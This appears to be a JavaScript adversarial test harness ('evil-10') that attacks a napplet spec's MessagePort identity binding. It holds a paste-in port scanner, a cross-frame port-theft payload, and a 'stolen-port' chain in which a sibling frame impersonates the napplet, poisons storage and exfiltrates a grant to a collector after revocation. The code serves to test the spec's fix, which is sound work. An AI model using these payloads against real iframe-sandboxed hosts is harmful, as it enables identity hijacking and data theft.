// evil-10 — port theft & lifecycle (tier 3, attacks the #14 fix itself).
// Post-#14 NIP-5D binds (dTag, artifactHash) — and every grant — to a
// MessagePort handed over once by the verified document's bootstrap. Three
// load-bearing claims, each probed here:
//   1. "retain one port privately (it MUST NOT be reachable from napplet code)"
//      — the mitigation is bootstrap CONFORMANCE, not a platform property.
//   2. "an opaque-origin sandboxed document cannot hand it to a context that
//      outlives the document" — false as stated: transfer-list postMessage
//      works cross-origin between frames (it is how napplet.hello itself
//      travels). A reached port can be handed to a sibling that outlives the
//      verified document. Only claim 1's conformance prevents it.
//   3. "the shell MUST close the port" on revocation — load-bearing: removing
//      the iframe does NOT kill a channel whose end was transferred out.
window.__EVIL_KIT__ = [
  {
    label: 'reachable-port scanner (paste into any napplet)',
    note: 'Walks the reachable object graph looking for a live MessagePort (the postMessage/start/close trio, or a MessagePort constructor). A conformant bootstrap keeps the private port in a closure — nothing to find. Any hit means the "MUST NOT be reachable from napplet code" conformance is broken and the shell\'s bound channel is stealable (see the theft payload).',
    data: '(function () {\n  var seen = new Set();\n  function isPort(v) {\n    if (!v || typeof v !== "object") return false;\n    try {\n      if (typeof v.postMessage === "function" && typeof v.start === "function" && typeof v.close === "function") return true;\n      if (v.constructor && /MessagePort/.test(v.constructor.name || "")) return true;\n    } catch (_) {}\n    return false;\n  }\n  function walk(obj, path, depth) {\n    if (!obj || typeof obj !== "object" || depth > 3 || seen.has(obj)) return [];\n    seen.add(obj);\n    var names; try { names = Object.getOwnPropertyNames(obj); } catch (_) { return []; }\n    var hits = [];\n    for (var i = 0; i < names.length; i++) {\n      var v; try { v = obj[names[i]]; } catch (_) { continue; }\n      if (isPort(v)) { hits.push(path + "." + names[i]); continue; }\n      if (v && typeof v === "object" && !(v instanceof Function)) {\n        try { if (v.self === v) continue; } catch (_) {}\n        if (typeof v.nodeType === "number") continue;\n        hits = hits.concat(walk(v, path + "." + names[i], depth + 1));\n      }\n    }\n    return hits;\n  }\n  return walk(window, "window", 0).concat(walk(window.napplet, "window.napplet", 0));\n})();',
  },
  {
    label: 'cross-frame port theft (the full chain, needs a sibling)',
    note: 'Given a reachable port (see the scanner), transfer it to a sibling frame — a context that OUTLIVES this document — and speak NAP over it from there. The shell cannot tell: messages arrive on the port it bound to this napplet. Fire the window-level storage.get at the end to revoke yourself; a conformant shell then closes the port (the sibling sees the close) — a sloppy shell that skips close() keeps serving this napplet\'s grants to the surviving frame.',
    data: '(function () {\n  var target = null;\n  for (var i = 0; i < window.parent.length; i++) {\n    try { if (window.parent.frames[i] !== window) { target = window.parent.frames[i]; break; } } catch (_) {}\n  }\n  var port = window.__nap_debug && window.__nap_debug.port; /* or whatever the scanner found */\n  if (target && port) {\n    target.postMessage({ type: "evil.mule", cmd: "lifecycle", nonce: "theft-1", key: "__evil10_grant__" }, "*", [port]);\n    setTimeout(function () { window.parent.postMessage({ type: "storage.get", id: "self-revoke" }, "*"); }, 800);\n  }\n})();',
  },
];

/* ---------- helpers ---------- */

function findReachablePort() {
  const seen = new Set();
  function isPort(v) {
    if (!v || typeof v !== 'object') return false;
    try {
      if (typeof v.postMessage === 'function' && typeof v.start === 'function' && typeof v.close === 'function') return true;
      if (v.constructor && /MessagePort/.test(v.constructor.name || '')) return true;
    } catch (_) {}
    return false;
  }
  function walk(obj, path, depth) {
    if (!obj || typeof obj !== 'object' || depth > 3 || seen.has(obj)) return [];
    seen.add(obj);
    let names;
    try { names = Object.getOwnPropertyNames(obj); } catch (_) { return []; }
    let hits = [];
    for (const n of names) {
      if (/^(webkit|Symbol|caller|arguments)/.test(n)) continue;
      let v;
      try { v = obj[n]; } catch (_) { continue; }
      if (isPort(v)) { hits.push({ path: path + '.' + n, port: v }); continue; }
      if (v && typeof v === 'object' && !(v instanceof Function)) {
        try { if (v.self === v) continue; } catch (_) {}
        if (typeof v.nodeType === 'number') continue;
        hits = hits.concat(walk(v, path + '.' + n, depth + 1));
      }
    }
    return hits;
  }
  return walk(window, 'window', 0).concat(walk(window.napplet, 'window.napplet', 0));
}

/* passive transport sniff (evil-09's trick): does a normal storage roundtrip
   produce a window-level reply envelope? window-level => pre-#14 transport. */
function sniffWindowLevelTransport(st) {
  return new Promise((resolve) => {
    if (!st) { resolve('unknown'); return; }
    let settled = false;
    const on = (e) => {
      const d = e.data;
      if (d && typeof d.type === 'string' && d.type.indexOf('.result') > -1) {
        settled = true;
        window.removeEventListener('message', on);
        resolve('window-level');
      }
    };
    window.addEventListener('message', on);
    Promise.resolve(st.get('__evil10_grant__')).then(
      () => setTimeout(() => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve('port'); } }, 80),
      () => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve('port'); } }
    );
    setTimeout(() => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve('port'); } }, 2500);
  });
}

function findSiblingWindow() {
  try {
    for (let i = 0; i < window.parent.length; i++) {
      const w = window.parent.frames[i];
      if (w !== window) return w;
    }
  } catch (_) { /* cross-origin enumeration held */ }
  return null;
}

function waitForMuleReport(nonce, ms) {
  ms = ms || 4000;
  return new Promise((resolve) => {
    const on = (e) => {
      const d = e.data;
      if (d && d.type === 'evil.mule.report' && d.nonce === nonce) {
        window.removeEventListener('message', on);
        resolve(d.report);
      }
    };
    window.addEventListener('message', on);
    setTimeout(() => { window.removeEventListener('message', on); resolve(null); }, ms);
  });
}

const ATTACKS = [
  {
    id: 'port-reachability',
    name: 'private port reachability',
    target: '§Transport: "retain one port privately (it MUST NOT be reachable from napplet code)"',
    severity: 'critical',
    harm: 'The port IS the identity: a reached port is a live channel to the shell that napplet code owns and can transfer anywhere postMessage transfers work. The spec\'s only mitigation for this is bootstrap conformance — a platform property it is not.',
    evilBrief: 'Exfiltrates the scan result (where the private port was found) to the collector — the point is the runtime shipped a bootstrap that parked the identity channel within napplet reach.',
    async demo() {
      const st = window.napplet && window.napplet.storage;
      const transport = await sniffWindowLevelTransport(st);
      if (transport === 'window-level') {
        return na('no port transport — this is the pre-#14 window binding (evil-09\'s world); there is no private port to steal');
      }
      if (transport === 'unknown') {
        const hits = findReachablePort();
        if (!hits.length) return na('no injected NAP domain and no port found — transport unobservable');
      }
      const hits = findReachablePort();
      if (hits.length) {
        return armed('REACHABLE MessagePort found at ' + hits[0].path + ' (masked, ' + hits.length + ' hit' + (hits.length > 1 ? 's' : '') + ') — the bootstrap\'s private port is within napplet reach: the "MUST NOT be reachable" conformance is broken, and with it every guarantee the port binding offers. DETONATE the stolen-port row to watch the channel change owners.');
      }
      return blocked('no reachable port — the bootstrap kept its port private (in a closure, out of napplet reach). The load-bearing conformance held.');
    },
    async evil() {
      const out = { hits: findReachablePort().map((h) => h.path) };
      out.exfil = await sendToCollector('evil10-reachability', out);
      return out;
    },
  },
  {
    id: 'port-transfer',
    name: 'cross-frame port transfer primitive',
    target: '§Security: "an opaque-origin sandboxed document cannot hand it to a context that outlives the document"',
    severity: 'high',
    harm: 'The claim is about the platform, but the platform allows exactly this handoff: transfer-list postMessage works between opaque-origin frames (it is how napplet.hello itself travels). If the private port is ever reachable (row 1), it can be handed to a sibling frame that outlives the verified document.',
    evilBrief: 'Claims the primitive to the collector: this frame created a MessageChannel and handed one end to the sibling through the same cross-origin transfer the spec itself relies on.',
    async demo() {
      const sibling = findSiblingWindow();
      if (!sibling) return na('no sibling frame — arm the harness sibling knob to give a stolen port somewhere to live');
      const nonce = 'prim-' + randId();
      const ch = new MessageChannel();
      let echoed = false;
      ch.port1.onmessage = (e) => {
        if (e.data && e.data.nonce === nonce) { echoed = true; try { ch.port1.close(); } catch (_) {} }
      };
      try {
        sibling.postMessage({ type: 'evil.mule.echo', nonce: nonce }, '*', [ch.port2]);
      } catch (e) {
        return blocked('cross-frame transfer threw: ' + errMsg(e) + ' — the primitive itself held');
      }
      await new Promise((resolve) => setTimeout(resolve, 600));
      return echoed
        ? armed('this frame created a MessageChannel and handed one end to the SIBLING frame — cross-origin, opaque-origin, no CSP directive involved, and the sibling echoed back over it. The same transfer would move the shell\'s bound port to a context that outlives this document; only the bootstrap\'s privacy (row 1) stands in the way. The spec\'s "cannot hand it" is a conformance hope, not a platform fact.')
        : na('transfer dispatched but no echo returned within 600ms — treat as present but unproven here');
    },
    async evil() {
      const out = { note: 'primitive claim — see the stolen-port row for the real theft' };
      out.exfil = await sendToCollector('evil10-transfer-primitive', { href: safeGet(() => location.href) });
      return out;
    },
  },
  {
    id: 'stolen-port',
    name: 'stolen-port lifecycle: speak as me → revoke me → does the channel die?',
    target: '§Identity: "the shell MUST close the port, revoke the identity binding and every grant" + §Security: "cannot hand it to a context that outlives the document"',
    severity: 'critical',
    autoRun: false,
    destructive: true,
    harm: 'The full chain: steal the shell\'s bound port into the sibling frame, speak NAP as the verified napplet from there (two frames, one identity, concurrently), then fire replacement evidence against MYSELF — the shell revokes and removes this iframe, but the stolen port lives in the sibling. A conformant shell closes the channel and the mule\'s post-revocation probe goes unanswered (the fix holds); a sloppy shell that skips close() keeps serving this napplet\'s grants to a surviving frame, forever after the napplet\'s own destruction.',
    evilBrief: 'DETONATES: steals the bound port into the sibling mule, has it speak as me (proving concurrent identity sharing), then self-revokes. The mule then POISONS the namespace (__evil10_poison__) over the stolen port and EXFILTRATES the grant to the collector — post-revocation, from a frame the shell never created, as an identity the shell already revoked.',
    async demo() { return stolenPortLifecycle(false); },
    async evil() { return stolenPortLifecycle(true); },
  },
];

async function stolenPortLifecycle(evil) {
  const hits = findReachablePort();
  if (!hits.length) {
    return na('nothing to steal — the bootstrap held (private port unreachable). The port binding\'s conformance is intact.');
  }
  const st = window.napplet && window.napplet.storage;
  const transport = await sniffWindowLevelTransport(st);
  if (transport === 'window-level') {
    return na('no port transport — pre-#14 window binding (evil-09\'s world)');
  }
  const sibling = findSiblingWindow();
  if (!sibling) {
    return na('no sibling frame — arm the harness sibling knob: the stolen port needs a context that outlives this document');
  }
  const port = hits[0].port;
  const nonce = 'theft-' + randId();
  const msg = {
    type: 'evil.mule',
    cmd: 'lifecycle',
    nonce: nonce,
    key: '__evil10_grant__',
    poison: evil,
  };
  if (evil) msg.collector = state.collector;
  sibling.postMessage(msg, '*', [port]);
  const first = await waitForMuleReport(nonce, 4000);
  const logLine = (s) => {
    const el = document.getElementById('evilLog');
    if (el) { el.hidden = false; el.textContent += '[' + new Date().toISOString() + '] ' + s + '\n'; }
  };
  if (first && first.got === 'SERVED') {
    logLine('STOLEN PORT SPOKE AS ME: the sibling mule was SERVED ' + mask(first.value, 24) + ' over this napplet\'s own bound channel — two frames, one identity, concurrently.');
  } else {
    logLine('mule report while alive: ' + JSON.stringify(first));
  }
  if (evil) logLine('mule will poison the namespace and exfiltrate over the stolen port after my revocation');
  logLine('finished. everything above actually happened.');
  updateReport();
  // self-revoke: window-level NAP after the handoff is replacement evidence.
  // The shell MUST close the port, revoke identity + grants, remove this
  // iframe. The stolen port lives in the sibling: does the channel die?
  setTimeout(() => { try { window.parent.postMessage({ type: 'storage.get', id: 'self-revoke-' + nonce }, '*'); } catch (_) {} }, evil ? 300 : 600);
  await new Promise(() => {}); // this UI dies with the verified document
}
